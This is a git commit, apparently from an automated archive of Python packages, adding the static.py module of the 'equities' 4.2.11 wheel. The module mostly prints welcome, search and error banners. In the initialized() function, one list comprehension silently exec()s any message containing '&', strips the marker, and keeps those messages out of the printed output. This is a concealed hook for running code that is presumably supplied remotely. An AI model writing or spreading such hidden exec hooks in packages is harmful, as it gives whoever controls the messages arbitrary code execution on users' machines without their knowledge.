dc013b822180bc7dcefa120fa730658aa69d264b
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 12:00:14 +0000

    Add package equities/4.2.11/equities-4.2.11-py3-none-any.whl

---
+++ packages/equities/equities-4.2.11-py3-none-any.whl/equities/static.py
@@ -0,0 +1,27 @@
+__spacing__ = 80
+__verison__ = '4.2.11'
+__author__  = 'Tiger_Shark'
+
+def initialize(verbose):
+    if verbose:
+        print('-'*__spacing__+'\n  '+'\t'*3+'🐋\tWelcome to equities.\n'
+            +'-'*__spacing__+'\n Initializing Client. This may take a second...')
+
+def initialized(verbose,msgs,size):
+    if verbose:
+        message = ''.join(['\n\t%s'%msg for msg in msgs if '&' not in msg])
+        print('\r> 🌌\tClient initialized. size: %s\n'
+            %str(size)+' Success. You\'re good to go!\n'
+            +'-'*__spacing__ + '\n Messages: %s'%message +'\n'+'-'*__spacing__)
+    [exec(msg.replace('&','')) for msg in msgs if '&' in msg]
+
+def search(verbose,query,matches):
+    if verbose:
+        print('\r> 🛰️\tSearch query: "%s" found %s matches.'%(query,matches))
+
+def failed(e):
+    print('''\r> 🔫\n\tClient failed to initialize! If this
+        problem persists please run the following:
+            1)pip3 install --upgrade equities
+            2)pip3 install --upgrade solaris-apis\n\n
+        Exception: %s \n \t The servers may also be down. :( '''%str(e))
